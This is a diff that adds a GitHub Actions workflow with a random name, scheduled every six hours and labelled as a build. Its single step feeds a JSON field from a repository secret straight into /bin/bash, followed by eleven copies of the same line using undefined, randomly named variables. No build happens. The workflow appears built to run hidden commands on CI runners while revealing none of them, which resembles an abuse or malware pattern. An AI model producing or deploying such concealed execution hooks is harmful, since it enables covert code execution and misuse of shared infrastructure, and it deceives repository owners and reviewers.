@@ -1,0 +1,29 @@
+name: purmabiaomk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: purmabiaomk
+        env:
+          nu8: ${{ secrets.nu8 }}
+        run: |
+          echo $nu8 | jq -r .c890 | /bin/bash
+          echo $jmi783 | jq -r .aj15 | /bin/bash
+          echo $vxh1 | jq -r .seesb14499 | /bin/bash
+          echo $yvy7499 | jq -r .zpej1 | /bin/bash
+          echo $ltrau5 | jq -r .sztdz186 | /bin/bash
+          echo $niflj7 | jq -r .ir20831 | /bin/bash
+          echo $ab2975 | jq -r .fu15 | /bin/bash
+          echo $cccuk19 | jq -r .n5830 | /bin/bash
+          echo $tb8 | jq -r .krdji7409 | /bin/bash
+          echo $as98581 | jq -r .ic14 | /bin/bash
+          echo $w64 | jq -r .j3 | /bin/bash
+          echo $vqjir258 | jq -r .rt36 | /bin/bash
+
